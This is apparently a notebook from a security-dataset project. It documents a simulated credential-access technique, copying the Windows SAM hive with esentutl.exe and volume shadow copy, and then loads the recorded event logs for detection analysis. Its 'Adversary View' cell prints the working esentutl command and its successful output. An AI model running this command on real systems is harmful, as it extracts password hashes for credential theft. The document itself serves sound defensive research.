{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "6aee6894",
   "metadata": {},
   "source": [
    "# SAM Copy via Esentutl VSS"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "86850721",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9b25432a",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/19 |\n",
    "| Modification Date | 2020/10/19 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.002](https://attack.mitre.org/techniques/T1003/002) |\n",
    "| Tags              | art.a90c2f4d-6726-444e-99d2-a00cd7c20480 |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "53d55e40",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries copying the SAM hive using the esentutl.exe utility and volume shadow copy services."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "050a4344",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f2483636",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_sam_copy_esentutl.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_sam_copy_esentutl.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "64b08b76",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d7f156a",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "94b7aa15",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | Cmd | [Cmd](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "290de389",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Microsoft Windows [Version 10.0.18363.1139]\n",
    "(c) 2019 Microsoft Corporation. All rights reserved.\n",
    "\n",
    "C:\\Users\\wardog>esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d C:\\ProgramData\\SAM\n",
    "\n",
    "Extensible Storage Engine Utilities for Microsoft(R) Windows(R)\n",
    "Version 10.0\n",
    "Copyright (C) Microsoft Corporation. All Rights Reserved.\n",
    "\n",
    "Initializing VSS subsystem...\n",
    "\n",
    "Initiating COPY FILE mode...\n",
    "    Source File: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\n",
    "Destination File: C:\\ProgramData\\SAM\n",
    "\n",
    "                      Copy Progress (% complete)\n",
    "\n",
    "          0    10   20   30   40   50   60   70   80   90  100\n",
    "          |----|----|----|----|----|----|----|----|----|----|\n",
    "          ...................................................\n",
    "\n",
    "        Total bytes read                = 0x9000 (36864) (0 MB)\n",
    "        Total bytes written             = 0x9000 (36864) (0 MB)\n",
    "\n",
    "\n",
    "Operation completed successfully in 4.859 seconds.\n",
    "\n",
    "C:\\Users\\wardog>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "02da95ff",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ddd1cfc9",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b62bca2a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_sam_copy_esentutl.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f711d4a2",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "77150bfc",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "98b8cea4",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fddd7bc1",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ef7e8156",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
